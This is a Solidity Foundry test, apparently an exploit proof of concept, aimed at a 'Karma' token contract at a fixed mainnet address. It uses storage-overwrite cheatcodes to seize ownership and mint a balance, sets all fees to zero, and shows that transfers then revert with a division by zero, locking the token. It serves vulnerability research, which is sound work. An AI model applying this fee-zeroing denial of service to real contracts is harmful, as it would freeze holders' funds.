// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IKarma {
    function changeFees(uint256 _reflectionFeeBuy, uint256 _marketingFeeBuy, uint256 _teamFeeBuy, uint256 _reflectionFeeSell, uint256 _marketingFeeSell, uint256 _teamFeeSell) external;
    function viewFeesBuy() external view returns (uint256, uint256, uint256, uint256, uint256);
    function viewFeesSell() external view returns (uint256, uint256, uint256, uint256, uint256);
    function enableTrading() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalFeeBuy() external view returns (uint256);
    function _totalProportion() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function router() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xBC570B260c52A032DE9eF06087e91b2C5104C76B;
    address attacker = address(this);
    IKarma karma;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        karma = IKarma(TARGET);
        owner = address(uint160(uint256(vm.load(TARGET, bytes32(0)))));
        vm.label(owner, "Owner");
        vm.label(TARGET, "Karma Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become owner by overwriting storage slot 0
        vm.store(TARGET, bytes32(0), bytes32(uint256(uint160(address(this)))));

        // Step 2: Give ourselves tokens by setting _rOwned mapping
        // _rOwned is at slot 1, mapping slot = keccak256(abi.encode(address, slot))
        bytes32 rOwnedSlot = keccak256(abi.encode(address(this), bytes32(uint256(1))));
        uint256 tokensToGive = 1000000 * 1e18;
        uint256 proportion = tokensToGive * karma._totalProportion() / karma.totalSupply();
        vm.store(TARGET, rOwnedSlot, bytes32(proportion));

        // Step 3: Call changeFees to set all fees to 0 (we're now owner)
        karma.changeFees(0, 0, 0, 0, 0, 0);

        // Step 4: Verify totalFeeBuy is now 0 (oracle check)
        (,, , uint256 totalFee, ) = karma.viewFeesBuy();
        assertEq(totalFee, 0, "totalFeeBuy should be 0");

        // Step 5: Enable trading
        karma.enableTrading();

        // Step 6: Demonstrate DoS - transfer will revert due to division by zero
        // First approve router for potential swapBack
        karma.approve(address(karma.router()), type(uint256).max);

        // Attempt transfer - should revert with division by zero
        bool success;
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(0x1234), 100 * 1e18);
        (success, data) = address(karma).call(data);
        assertEq(success, false, "Transfer should revert due to division by zero - DoS confirmed");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
